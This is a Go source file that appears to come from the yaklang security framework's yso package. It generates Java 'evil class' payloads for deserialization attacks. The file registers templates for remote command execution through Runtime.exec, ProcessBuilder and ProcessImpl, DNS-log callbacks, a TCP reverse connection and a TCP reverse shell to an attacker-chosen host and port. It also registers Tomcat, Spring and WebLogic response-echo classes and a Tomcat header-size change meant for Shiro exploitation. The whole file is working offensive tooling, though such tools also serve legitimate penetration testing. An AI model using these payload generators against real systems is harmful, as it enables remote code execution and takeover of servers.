package yso

import (
	"github.com/yaklang/yaklang/common/javaclassparser"
	"github.com/yaklang/yaklang/common/log"
	"github.com/yaklang/yaklang/common/utils"
	"github.com/yaklang/yaklang/common/yak/yaklib/codec"
	"strconv"
)

//type string string

const (
	RuntimeExecClass               = "RuntimeExecClass"
	ProcessBuilderExecClass        = "ProcessBuilderExecClass"
	ProcessImplExecClass           = "ProcessImplExecClass"
	DNSlogClass                    = "DNSlogClass"
	SpringEchoClass                = "SpringEchoClass"
	ModifyTomcatMaxHeaderSizeClass = "ModifyTomcatMaxHeaderSizeClass"
	EmptyClassInTemplate           = "EmptyClassInTemplate"
	TcpReverseClass                = "TcpReverseClass"
	TcpReverseShellClass           = "TcpReverseShellClass"
	TomcatEchoClass                = "TomcatEchoClass"
	BytesClass                     = "BytesClass"
	MultiEchoClass                 = "MultiEchoClass"
	//NoneClass                                = "NoneClass"
)

type ClassPayload struct {
	ClassName string
	Help      string
	Generator func(*ClassConfig) (*javaclassparser.ClassObject, error)
}

var AllClasses = map[string]*ClassPayload{}

func GetAllClassGenerator() map[string]*ClassPayload {
	return AllClasses
}
func setClass(t string, help string, f func(*ClassConfig) (*javaclassparser.ClassObject, error)) {
	AllClasses[t] = &ClassPayload{
		ClassName: string(t),
		Help:      help,
		Generator: func(config *ClassConfig) (*javaclassparser.ClassObject, error) {
			obj, err := f(config)
			if err != nil {
				return nil, err
			}
			if config.ClassType != EmptyClassInTemplate {
				config.ConfigCommonOptions(obj)
			}
			return obj, nil
		},
	}
}

type ClassConfig struct {
	Errors     []error
	ClassType  string
	ClassBytes []byte
	//ClassTemplate *javaclassparser.ClassObject
	//公共参数
	ClassName     string
	IsObfuscation bool
	IsConstruct   bool
	//exec参数
	Command string
	//dnslog参数
	Domain string
	//spring参数
	HeaderKey    string
	HeaderVal    string
	HeaderKeyAu  string
	HeaderValAu  string
	Param        string
	IsEchoBody   bool
	IsExecAction bool
	//Reverse参数
	Host  string
	Port  int
	Token string
}

func NewClassConfig(options ...GenClassOptionFun) *ClassConfig {
	o := ClassConfig{
		ClassName:     utils.RandStringBytes(8),
		IsObfuscation: true,
		IsConstruct:   false,
		IsEchoBody:    false,
		IsExecAction:  false,
	}
	obj := &o
	for _, option := range options {
		option(obj)
	}
	return obj
}
func (cf *ClassConfig) AddError(err error) {
	if err != nil {
		cf.Errors = append(cf.Errors, err)
	}
}
func (cf *ClassConfig) GenerateClassObject() (obj *javaclassparser.ClassObject, err error) {
	if cf.ClassType == BytesClass {
		obj, err = javaclassparser.Parse(cf.ClassBytes)
		if err != nil {
			return nil, err
		}
		return obj, nil
	}
	payload, ok := AllClasses[cf.ClassType]
	if !ok {
		return nil, utils.Errorf("not found class type: %s", cf.ClassType)
	}
	obj, err = payload.Generator(cf)
	if err != nil {
		return nil, err
	}
	return obj, nil
}
func (cf *ClassConfig) ConfigCommonOptions(obj *javaclassparser.ClassObject) error {
	obj.SetClassName(cf.ClassName)
	if cf.IsConstruct == true {
		constant := obj.FindConstStringFromPool("Yes")
		if constant == nil {
			err := utils.Error("not found flag: Yes")
			log.Error(err)
			return err
		}
		constant.Value = "No"
	}
	if cf.IsObfuscation == true {

	}
	return nil
}

func init() {
	setClass(
		RuntimeExecClass,
		"使用RuntimeExec命令执行",
		func(config *ClassConfig) (*javaclassparser.ClassObject, error) {
			obj, err := javaclassparser.Parse(template_class_RuntimeExec)
			if err != nil {
				return nil, err
			}
			if config.Command == "" {
				return nil, utils.Error("command is empty")
			}
			constant := obj.FindConstStringFromPool("whoami")
			if constant == nil {
				err = utils.Error("not found flag: whoami")
				log.Error(err)
				return nil, err
			}
			constant.Value = config.Command
			return obj, nil
		},
	)
	setClass(
		ProcessImplExecClass,
		"使用ProcessImpl命令执行",
		func(cf *ClassConfig) (*javaclassparser.ClassObject, error) {
			obj, err := javaclassparser.Parse(template_class_ProcessImplExec)
			if err != nil {
				return nil, err
			}
			if cf.Command == "" {
				return nil, utils.Error("command is empty")
			}
			constant := obj.FindConstStringFromPool("whoami")
			if constant == nil {
				err = utils.Error("not found flag: whoami")
				log.Error(err)
				return nil, err
			}
			constant.Value = cf.Command
			return obj, nil
		},
	)
	setClass(
		ProcessBuilderExecClass,
		"使用ProcessBuilderExecClass命令执行",
		func(cf *ClassConfig) (*javaclassparser.ClassObject, error) {
			obj, err := javaclassparser.Parse(template_class_ProcessBuilderExec)
			if err != nil {
				return nil, err
			}
			if cf.Command == "" {
				return nil, utils.Error("command is empty")
			}
			constant := obj.FindConstStringFromPool("whoami")
			if constant == nil {
				err = utils.Error("not found flag: whoami")
				log.Error(err)
				return nil, err
			}
			constant.Value = cf.Command
			return obj, nil
		},
	)
	setClass(
		DNSlogClass,
		"dnslog检测",
		func(cf *ClassConfig) (*javaclassparser.ClassObject, error) {
			obj, err := javaclassparser.Parse(template_class_dnslog)
			if err != nil {
				return nil, err
			}
			if cf.Domain == "" {
				return nil, utils.Error("domain is empty")
			}
			constant := obj.FindConstStringFromPool("dns")
			if constant == nil {
				err = utils.Error("not found flag: dnslog")
				log.Error(err)
				return nil, err
			}
			constant.Value = cf.Domain
			return obj, nil
		},
	)
	setClass(
		TcpReverseClass,
		"tcp反连，可用于tcp出网的站点漏洞检测",
		func(cf *ClassConfig) (*javaclassparser.ClassObject, error) {
			obj, err := javaclassparser.Parse(template_class_TcpReverse)
			if err != nil {
				return nil, err
			}
			if cf.Host == "" || cf.Port == 0 {
				return nil, utils.Error("host or port is empty")
			}
			constant := obj.FindConstStringFromPool("HostVal")
			if constant == nil {
				err = utils.Error("not found flag: HostVal")
				log.Error(err)
				return nil, err
			}
			constant.Value = cf.Host
			constant = obj.FindConstStringFromPool("Port")
			if constant == nil {
				err = utils.Error("not found flag: Port")
				log.Error(err)
				return nil, err
			}
			constant.Value = strconv.Itoa(cf.Port)
			if cf.Token != "" {
				constant = obj.FindConstStringFromPool("Token")
				if constant == nil {
					err = utils.Error("not found flag: Token")
					log.Error(err)
					return nil, err
				}
				constant.Value = cf.Token
			}
			return obj, nil
		},
	)
	setClass(
		TcpReverseShellClass,
		"tcp反弹shell",
		func(cf *ClassConfig) (*javaclassparser.ClassObject, error) {
			obj, err := javaclassparser.Parse(template_class_TcpReverseShell)
			if err != nil {
				return nil, err
			}
			if cf.Host == "" || cf.Port == 0 {
				return nil, utils.Error("host or port is empty")
			}
			constant := obj.FindConstStringFromPool("HostVal")
			if constant == nil {
				err = utils.Error("not found flag: HostVal")
				log.Error(err)
				return nil, err
			}
			constant.Value = cf.Host
			constant = obj.FindConstStringFromPool("Port")
			if constant == nil {
				err = utils.Error("not found flag: Port")
				log.Error(err)
				return nil, err
			}
			constant.Value = strconv.Itoa(cf.Port)
			return obj, nil
		},
	)
	setClass(
		ModifyTomcatMaxHeaderSizeClass,
		"修改tomcat的MaxHeaderSize，一般用于shiro利用",
		func(cf *ClassConfig) (*javaclassparser.ClassObject, error) {
			obj, err := javaclassparser.Parse(template_class_ModifyTomcatMaxHeaderSize)
			if err != nil {
				return nil, err
			}
			return obj, nil
		},
	)
	setClass(
		EmptyClassInTemplate,
		"用于Template代码执行的空类",
		func(cf *ClassConfig) (*javaclassparser.ClassObject, error) {
			obj, err := javaclassparser.Parse(template_class_EmptyClassInTemplate)
			if err != nil {
				return nil, err
			}

			return obj, nil
		},
	)
	setClass(
		BytesClass,
		"自定义字节码，需要BASE64编码",
		func(cf *ClassConfig) (*javaclassparser.ClassObject, error) {
			obj, err := javaclassparser.Parse(cf.ClassBytes)
			if err != nil {
				return nil, err
			}
			return obj, nil
		},
	)
	setClass(
		TomcatEchoClass,
		"适用于tomcat的回显",
		func(cf *ClassConfig) (*javaclassparser.ClassObject, error) {
			obj, err := javaclassparser.Parse(template_class_EchoByThread)
			if err != nil {
				return nil, err
			}
			javaClassBuilder := javaclassparser.NewClassObjectBuilder(obj)
			if cf.IsEchoBody {
				if cf.Param == "" {
					return nil, utils.Error("param is empty")
				}
				javaClassBuilder.SetValue("paramVal", cf.Param)
				javaClassBuilder.SetValue("postionVal", "body")
			} else {
				javaClassBuilder.SetValue("headerKeyv", cf.HeaderKey)
				javaClassBuilder.SetValue("headerValuev", cf.HeaderVal)
				javaClassBuilder.SetValue("postionVal", "header")
			}
			if cf.IsExecAction {
				javaClassBuilder.SetValue("actionVal", "exec")
			}
			if len(javaClassBuilder.GetErrors()) > 0 {
				log.Error(javaClassBuilder.GetErrors()[0])
				return nil, javaClassBuilder.GetErrors()[0]
			}
			return obj, nil
		},
	)
	setClass(
		MultiEchoClass,
		"适用于tomcat和weblogic的回显",
		func(cf *ClassConfig) (*javaclassparser.ClassObject, error) {
			obj, err := javaclassparser.Parse(template_class_MultiEcho)
			if err != nil {
				return nil, err
			}
			javaClassBuilder := javaclassparser.NewClassObjectBuilder(obj)
			if cf.IsEchoBody {
				if cf.Param == "" {
					return nil, utils.Error("param is empty")
				}
				javaClassBuilder.SetValue("paramVal", cf.Param)
				javaClassBuilder.SetValue("postionVal", "body")
			} else {
				javaClassBuilder.SetValue("headerKeyv", cf.HeaderKey)
				javaClassBuilder.SetValue("headerValuev", cf.HeaderVal)
				javaClassBuilder.SetValue("postionVal", "header")
			}
			if cf.IsExecAction {
				javaClassBuilder.SetValue("actionVal", "exec")
			}
			if len(javaClassBuilder.GetErrors()) > 0 {
				log.Error(javaClassBuilder.GetErrors()[0])
				return nil, javaClassBuilder.GetErrors()[0]
			}
			return obj, nil
		},
	)
	setClass(
		SpringEchoClass,
		"适用于spring站点的回显",
		func(cf *ClassConfig) (*javaclassparser.ClassObject, error) {
			obj, err := javaclassparser.Parse(template_class_SpringEcho)
			if err != nil {
				return nil, err
			}
			if cf.IsEchoBody {
				if cf.Param == "" {
					return nil, utils.Error("param is empty")
				}
				constant := obj.FindConstStringFromPool("paramVal")
				if constant == nil {
					err = utils.Error("not found flag: paramVal")
					log.Error(err)
					return nil, err
				}
				constant.Value = cf.Param
				constant = obj.FindConstStringFromPool("postionVal")
				if constant == nil {
					err = utils.Error("not found flag: postionVal")
					log.Error(err)
					return nil, err
				}
				constant.Value = "body"
			} else {
				constant := obj.FindConstStringFromPool("HeaderKeyVal")
				if constant == nil {
					err = utils.Error("not found flag: HeaderKeyVal")
					log.Error(err)
					return nil, err
				}
				constant.Value = cf.HeaderKey
				constant = obj.FindConstStringFromPool("HeaderVal")
				if constant == nil {
					err = utils.Error("not found flag: HeaderVal")
					log.Error(err)
					return nil, err
				}
				constant.Value = cf.HeaderVal

			}
			if cf.IsExecAction {
				constant := obj.FindConstStringFromPool("actionVal")
				if constant == nil {
					err = utils.Error("not found flag: actionVal")
					log.Error(err)
					return nil, err
				}
				constant.Value = "exec"
			}
			return obj, nil
		},
	)

}

type GenClassOptionFun func(config *ClassConfig)

//var defaultOptions = []GenClassOptionFun{SetRandClassName(), SetObfuscation()}

//var templateOptions = []GenClassOptionFun{
//	SetClassRuntimeExecTemplate(),
//	SetClassSpringEchoTemplate(),
//	SetClassDnslogTemplate(),
//	SetClassModifyTomcatMaxHeaderSizeTemplate(),
//}

// 公共参数
func SetClassName(className string) GenClassOptionFun {
	return func(config *ClassConfig) {
		config.ClassName = className
	}
}

func SetConstruct() GenClassOptionFun {
	return func(config *ClassConfig) {
		config.IsConstruct = true
	}
}
func SetObfuscation() GenClassOptionFun {
	return func(config *ClassConfig) {
		config.IsObfuscation = true
	}
}

// 生成自定义Class
func SetBytesEvilClass(data []byte) GenClassOptionFun {
	return func(config *ClassConfig) {
		config.ClassType = BytesClass
		config.ClassBytes = data
	}
}
func SetClassBase64Bytes(base64 string) GenClassOptionFun {
	bytes, err := codec.DecodeBase64(base64)
	if err != nil {
		log.Error(err)
		return nil
	}
	return SetClassBytes(bytes)
}
func SetClassBytes(data []byte) GenClassOptionFun {
	return func(config *ClassConfig) {
		config.ClassType = BytesClass
		config.ClassBytes = data
	}
}

func LoadClassFromBytes(bytes []byte, options ...GenClassOptionFun) (*javaclassparser.ClassObject, error) {
	return GenerateClassObjectFromBytes(bytes, options...)
}

func LoadClassFromBase64(base64 string, options ...GenClassOptionFun) (*javaclassparser.ClassObject, error) {
	bytes, err := codec.DecodeBase64(base64)
	if err != nil {
		log.Error(err)
		return nil, err
	}
	return GenerateClassObjectFromBytes(bytes, options...)
}

func LoadClassFromBCEL(data string, options ...GenClassOptionFun) (*javaclassparser.ClassObject, error) {
	bytes, err := javaclassparser.Bcel2bytes(data)
	if err != nil {
		log.Error(err)
		return nil, err
	}
	return GenerateClassObjectFromBytes(bytes, options...)
}

func LoadClassFromJson(jsonData string, options ...GenClassOptionFun) (*javaclassparser.ClassObject, error) {
	bytes, err := codec.DecodeBase64(jsonData)
	if err != nil {
		log.Error(err)
		return nil, err
	}
	return GenerateClassObjectFromBytes(bytes, options...)
}

func GenerateClassObjectFromBytes(bytes []byte, options ...GenClassOptionFun) (*javaclassparser.ClassObject, error) {
	config := NewClassConfig(append(options, SetClassBytes(bytes))...)
	config.ClassType = BytesClass
	return config.GenerateClassObject()
}

func SetExecCommand(cmd string) GenClassOptionFun {
	return func(config *ClassConfig) {
		config.Command = cmd
	}
}

// RuntimeExec 参数
func SetClassRuntimeExecTemplate() GenClassOptionFun {
	return func(config *ClassConfig) {
		config.ClassType = RuntimeExecClass
	}
}

func SetRuntimeExecEvilClass(cmd string) GenClassOptionFun {
	return func(config *ClassConfig) {
		config.ClassType = RuntimeExecClass
		config.Command = cmd
	}
}
func GenerateRuntimeExecEvilClassObject(cmd string, options ...GenClassOptionFun) (*javaclassparser.ClassObject, error) {
	config := NewClassConfig(append(options, SetClassRuntimeExecTemplate(), SetExecCommand(cmd))...)
	config.ClassType = RuntimeExecClass
	return config.GenerateClassObject()
}

// ProcessBuilderExec 参数
func SetClassProcessBuilderExecTemplate() GenClassOptionFun {
	return func(config *ClassConfig) {
		config.ClassType = ProcessBuilderExecClass
	}
}
func SetProcessBuilderExecEvilClass(cmd string) GenClassOptionFun {
	return func(config *ClassConfig) {
		config.ClassType = ProcessBuilderExecClass
		config.Command = cmd
	}
}
func GenerateProcessBuilderExecEvilClassObject(cmd string, options ...GenClassOptionFun) (*javaclassparser.ClassObject, error) {
	ops := []GenClassOptionFun{SetClassProcessBuilderExecTemplate(), SetExecCommand(cmd)}
	config := NewClassConfig(append(options, ops...)...)
	return config.GenerateClassObject()
}

// ProcessImplExec 参数
func SetClassProcessImplExecTemplate() GenClassOptionFun {
	return func(config *ClassConfig) {
		config.ClassType = ProcessImplExecClass
	}
}
func SetProcessImplExecEvilClass(cmd string) GenClassOptionFun {
	return func(config *ClassConfig) {
		config.ClassType = ProcessImplExecClass
		config.Command = cmd
	}
}
func GenerateProcessImplExecEvilClassObject(cmd string, options ...GenClassOptionFun) (*javaclassparser.ClassObject, error) {
	ops := []GenClassOptionFun{SetClassProcessImplExecTemplate(), SetExecCommand(cmd)}
	config := NewClassConfig(append(options, ops...)...)
	return config.GenerateClassObject()
}

// dnslog参数
func SetClassDnslogTemplate() GenClassOptionFun {
	return func(config *ClassConfig) {
		config.ClassType = DNSlogClass
	}
}
func SetDnslog(addr string) GenClassOptionFun {
	return func(config *ClassConfig) {
		config.Domain = addr
	}
}
func SetDnslogEvilClass(addr string) GenClassOptionFun {
	return func(config *ClassConfig) {
		config.ClassType = DNSlogClass
		config.Domain = addr
	}
}

// dnslog生成
func GenDnslogClassObject(domain string, options ...GenClassOptionFun) (*javaclassparser.ClassObject, error) {
	ops := []GenClassOptionFun{SetClassDnslogTemplate(), SetDnslog(domain)}
	config := NewClassConfig(append(options, ops...)...)
	return config.GenerateClassObject()
}

// spring参数
func SetClassSpringEchoTemplate() GenClassOptionFun {
	return func(config *ClassConfig) {
		config.ClassType = SpringEchoClass
	}
}

func SetHeader(key string, val string) GenClassOptionFun {
	return func(config *ClassConfig) {
		config.HeaderKey = key
		config.HeaderVal = val
	}
}
func SetParam(val string) GenClassOptionFun {
	return func(config *ClassConfig) {
		config.Param = val
	}
}
func SetExecAction() GenClassOptionFun {
	return func(config *ClassConfig) {
		config.IsExecAction = true
	}
}
func SetEchoBody() GenClassOptionFun {
	return func(config *ClassConfig) {
		config.IsEchoBody = true
	}
}

// spring生成
func GenerateSpringEchoEvilClassObject(options ...GenClassOptionFun) (*javaclassparser.ClassObject, error) {
	config := NewClassConfig(append(options, SetClassSpringEchoTemplate())...)
	return config.GenerateClassObject()
}

// ModifyTomcatMaxHeaderSize
func SetClassModifyTomcatMaxHeaderSizeTemplate() GenClassOptionFun {
	return func(config *ClassConfig) {
		config.ClassType = ModifyTomcatMaxHeaderSizeClass
	}
}

func GenerateModifyTomcatMaxHeaderSizeEvilClassObject(options ...GenClassOptionFun) (*javaclassparser.ClassObject, error) {
	config := NewClassConfig(append(options, SetClassModifyTomcatMaxHeaderSizeTemplate())...)
	return config.GenerateClassObject()
}

// 空类生成（用于template）
func GenEmptyClassInTemplateClassObject(options ...GenClassOptionFun) (*javaclassparser.ClassObject, error) {
	config := NewClassConfig(options...)
	config.ClassType = EmptyClassInTemplate
	return config.GenerateClassObject()
}

// 生成tcp反连
func SetClassTcpReverseTemplate() GenClassOptionFun {
	return func(config *ClassConfig) {
		config.ClassType = TcpReverseClass
	}
}
func SetTcpReverseHost(host string) GenClassOptionFun {
	return func(config *ClassConfig) {
		config.Host = host
	}
}
func SetTcpReversePort(port int) GenClassOptionFun {
	return func(config *ClassConfig) {
		config.Port = port
	}
}
func SetTcpReverseToken(token string) GenClassOptionFun {
	return func(config *ClassConfig) {
		config.Token = token
	}
}
func SetTcpReverseEvilClass(host string, port int) GenClassOptionFun {
	return func(config *ClassConfig) {
		config.ClassType = TcpReverseClass
		config.Host = host
		config.Port = port
	}
}
func GenTcpReverseClassObject(host string, port int, options ...GenClassOptionFun) (*javaclassparser.ClassObject, error) {
	config := NewClassConfig(options...)
	config.Host = host
	config.Port = port
	config.ClassType = TcpReverseClass
	return config.GenerateClassObject()
}

// 生成tcp反弹shell
func SetClassTcpReverseShellTemplate() GenClassOptionFun {
	return func(config *ClassConfig) {
		config.ClassType = TcpReverseShellClass
	}
}
func SetTcpReverseShellEvilClass(host string, port int) GenClassOptionFun {
	return func(config *ClassConfig) {
		config.ClassType = TcpReverseShellClass
		config.Host = host
		config.Port = port
	}
}
func GenTcpReverseShellClassObject(host string, port int, options ...GenClassOptionFun) (*javaclassparser.ClassObject, error) {
	config := NewClassConfig(options...)
	config.Host = host
	config.Port = port
	config.ClassType = TcpReverseShellClass
	return config.GenerateClassObject()
}

// Tomcat回显
func SetClassTomcatEchoTemplate() GenClassOptionFun {
	return func(config *ClassConfig) {
		config.ClassType = TomcatEchoClass
	}
}

func SetTomcatEchoEvilClass() GenClassOptionFun {
	return func(config *ClassConfig) {
		config.ClassType = TomcatEchoClass
	}
}
func GenTomcatEchoClassObject(options ...GenClassOptionFun) (*javaclassparser.ClassObject, error) {
	config := NewClassConfig(options...)
	config.ClassType = TomcatEchoClass
	return config.GenerateClassObject()
}

// MultiEcho
func SetClassMultiEchoTemplate() GenClassOptionFun {
	return func(config *ClassConfig) {
		config.ClassType = MultiEchoClass
	}
}

func SetMultiEchoEvilClass() GenClassOptionFun {
	return func(config *ClassConfig) {
		config.ClassType = MultiEchoClass
	}
}
func GenMultiEchoClassObject(options ...GenClassOptionFun) (*javaclassparser.ClassObject, error) {
	config := NewClassConfig(options...)
	config.ClassType = MultiEchoClass
	return config.GenerateClassObject()
}
